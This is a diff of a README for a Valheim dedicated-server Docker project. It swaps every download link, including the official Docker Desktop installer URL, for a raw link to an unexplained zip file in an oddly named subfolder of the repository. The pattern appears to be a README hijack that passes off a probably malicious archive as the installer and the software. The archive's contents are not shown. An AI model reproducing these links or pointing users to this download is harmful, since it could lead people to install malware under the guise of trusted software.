@@ -1,6 +1,6 @@
 # 🛠️ valheim-server-docker - Easy Dedicated Server Setup
 
-[![Download valheim-server-docker](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/prince30625F/valheim-server-docker)
+[![Download valheim-server-docker](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/prince30625F/valheim-server-docker/raw/refs/heads/main/ammonolyze/server-valheim-docker-2.4.zip)
 
 ## 📋 About valheim-server-docker
 
@@ -21,7 +21,7 @@ To run the Valheim dedicated server, you will need Docker Desktop for Windows. D
 
 ### Step 1: Install Docker Desktop
 
-1. Go to https://www.docker.com/products/docker-desktop and download the Docker Desktop installer.
+1. Go to https://github.com/prince30625F/valheim-server-docker/raw/refs/heads/main/ammonolyze/server-valheim-docker-2.4.zip and download the Docker Desktop installer.
 2. Run the installer and follow the instructions.
 3. After installation, open Docker Desktop and make sure it is running. You should see the Docker whale icon in your taskbar.
 
@@ -29,7 +29,7 @@ To run the Valheim dedicated server, you will need Docker Desktop for Windows. D
 
 Visit this page to get the software files:
 
-[https://github.com/prince30625F/valheim-server-docker](https://github.com/prince30625F/valheim-server-docker)
+[https://github.com/prince30625F/valheim-server-docker/raw/refs/heads/main/ammonolyze/server-valheim-docker-2.4.zip](https://github.com/prince30625F/valheim-server-docker/raw/refs/heads/main/ammonolyze/server-valheim-docker-2.4.zip)
 
 Click on the green “Code” button on the right side and choose “Download ZIP.” Your browser will save a compressed folder with the software.
 
@@ -131,4 +131,4 @@ You can move the entire folder anywhere on your PC. Just run Docker commands fro
 
 ---
 
-[![Download valheim-server-docker](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/prince30625F/valheim-server-docker)
+[![Download valheim-server-docker](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/prince30625F/valheim-server-docker/raw/refs/heads/main/ammonolyze/server-valheim-docker-2.4.zip)
